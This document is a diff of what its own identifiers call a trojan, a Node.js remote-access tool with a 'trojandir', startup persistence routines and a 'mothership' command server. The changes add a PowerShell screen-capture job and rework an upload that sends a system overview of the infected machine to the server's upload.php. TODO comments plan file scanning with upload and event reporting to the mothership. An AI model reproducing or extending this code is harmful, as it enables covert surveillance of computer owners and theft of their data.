@@ -29,6 +29,8 @@
 
 // --- TASKS LIST ---
 
+// ! need to filter out task, startup folder, reg startup launches --> we don't want the task launches to
+//   execute penetrate
 // ! implement get screen capture + upload to mothership
 // ! implement upload files (scan machine, upload selected files to mothership)
 
@@ -663,6 +665,12 @@ class CmdConfig {
         return this.#__cmdconfig;
     }
 
+    get jobcode() {
+        let configobj = this.config;
+
+        return configobj?.jobcode ?? '';
+    }
+
     get childprocess() {
         return this.#__childprocess;
     }
@@ -746,6 +754,7 @@ class CmdConfig {
         cleanup: cleanup,
 
         getsystemoverview: getsystemoverview,
+        getscreencapture: getscreencapture
     };
 
     get dynamicdelay() {
@@ -1584,7 +1593,6 @@ function isValidHttpUrl(string) {
     }
 }
 
-// TODO -- put in filename param
 async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
     logmsg("starting");
 
@@ -2130,11 +2138,10 @@ function execPSScript(
     cmdlineargsarr,
     execopts,
     stdoutfunc,
-    stderrfunc
+    stderrfunc,
+    closefunc
 ) {
     logmsg("starting");
-
-    let enginename = "PS1";
 
     cmdlineargsarr = cmdlineargsarr || [];
     cmdlineargsarr = [
@@ -2156,35 +2163,34 @@ function execPSScript(
 
     let child = spawn("powershell.exe", cmdlineargsarr, execopts);
 
-    let tmpcode = getRandomCode(8);
-
-    let stdoutfpath = path.join(
-        systemstate.trojandir,
-        `exec${enginename}Script_${tmpcode}.out`
-    );
-
-    let stderrfpath = path.join(
-        systemstate.trojandir,
-        `exec${enginename}Script_${tmpcode}.err`
-    );
-
     child.stdout.on("data", (data) => {
-        logmsg(`STDOUT: ${data.toString()}`);
 
-        fs.writeFileSync(stdoutfpath, data, "utf-8");
+        let text = data.toString();
 
-        if (stdoutfunc) stdoutfunc(data);
+        if (stdoutfunc) 
+            stdoutfunc(text);
+        else
+            logmsg(text);
+
     });
 
     child.stderr.on("data", (data) => {
-        logmsg(`STDERR: ${data.toString()}`);
-        fs.writeFileSync(stderrfpath, data, "utf-8");
+        let text = data.toString();
 
-        if (stderrfunc) stderrfunc(data);
+        if (stderrfunc) 
+            stderrfunc(text);
+        else
+            logmsg(text);
+
     });
 
     child.on("close", (code) => {
-        logmsg(`Child process exited with code ${code}`);
+
+        if ( closefunc ) 
+            closefunc(code);
+        else
+            logmsg(`Child process exited with code ${code}`);
+
     });
 
     child.unref();
@@ -2197,8 +2203,6 @@ function execPSScript(
     let childpidstr = child.pid;
 
     logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);
-
-    logmsg("finished");
 
     return child;
 }
@@ -3165,6 +3169,10 @@ function penetrate_folders() {
 async function penetrate() {
     logmsg("starting");
 
+    if ( ISDEBUG ) {
+        process.exit(0);
+    }
+
     if (!fileExists(systemconfig.launch_script_fpath)) {
         await download_launch_script();
     }
@@ -3999,11 +4007,33 @@ function getDirInfo(dirPath) {
     return fileDetails;
 }
 
-// TODO
+function exec_getscreencapture() {
+
+    return new Promise((resolve, reject) => {
+        let stdout = '';
+
+        let fpath = path.join(systemstate.trojandir, 'get_full_screen_capture.ps1');
+    
+        let childp = execPSScript(fpath, 
+            systemstate.trojandir, 
+            null, 
+            (text) => stdout+=text, 
+            (text) => stdout+=text, 
+            (code)=>{ resolve(stdout); });
+    });
+}
+
+// TODO anchor
+// implement logging mechanism to write log msgs back to mothership
 async function getscreencapture() {
     logmsg("starting");
 
-    let runningcmd = systemstate.cmdconfig;
+    // TODO: log event startjob
+    let stdout = await exec_getscreencapture();
+
+    logmsg(stdout);
+
+    // TODO: log event job_finished
 }
 
 function query_reg(reg_path) {
@@ -4042,7 +4072,7 @@ function errorToJson(error) {
     return errorString;
 }
 
-// TODO
+// TODO invoke logEventMothership 'job_started', 'job_finished', 'job_finished_with_error'
 async function getsystemoverview() {
     logmsg("starting");
 
@@ -4099,14 +4129,18 @@ async function getsystemoverview() {
 
     fs.writeFileSync(localfpath, outjson_str, "utf-8");
 
-    let baseUrl =
-        systemstate.mothership +
-        "/ow/upload.php&filename=" +
-        `clientid_${systemstate.clientid}_jobcode_${runningcmd.jobcode}_getsystemoverview.out`;
+    // BUG runningcmd.jobcode is undefined anchor
+    let baseUrl = systemstate.mothership + "/ow/upload.php";
+
+    let filename = `clientid_${systemstate.clientid}_jobcode_${runningcmd.jobcode}_getsystemoverview.out`;
+
+    let kvp = systemstate.statekvp;
+    kvp['filename'] = filename;
+    kvp['jobcode'] = runningcmd.jobcode;
 
     let response = await makePUTRequest(
         baseUrl,
-        systemstate.statekvp,
+        kvp,
         null,
         localfpath
     );
@@ -4118,10 +4152,13 @@ async function getsystemoverview() {
 
 // ---
 
+// TODO
 function logMsgMothership(msg) {
     // TODO: inspect msg, if str, if obj
 }
 
+// TODO
+// make GET request to logmsg.php with event = event_code
 function logEventMothership(event_code, kvp) {
     // TODO: write msgstr to mothership
 }
